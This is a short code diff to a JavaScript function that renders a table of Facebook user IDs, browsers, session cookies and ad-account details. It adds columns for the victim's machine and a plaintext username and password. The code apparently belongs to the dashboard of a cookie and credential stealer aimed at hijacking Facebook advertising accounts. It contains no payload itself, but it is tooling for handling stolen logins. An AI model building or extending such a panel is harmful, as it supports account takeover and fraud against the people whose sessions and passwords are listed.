@@ -49,12 +49,14 @@ function setListCookies(res){
                 <a href="https://facebook.com/${element['uid']}" class="name">${element['uid']}</a>
             </div>
             </td>
+            <td>${element['machine']}</td>
             <td>${element['browser']}</td>
             <td>
                 <div class="form-group purple-border">
                     <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
                 </div>
-            </td>`;
+            </td>
+            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
             if(infoAds!=null){
                 htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
                 <td>${infoAds['currency']} / ${infoAds['country']}</td>
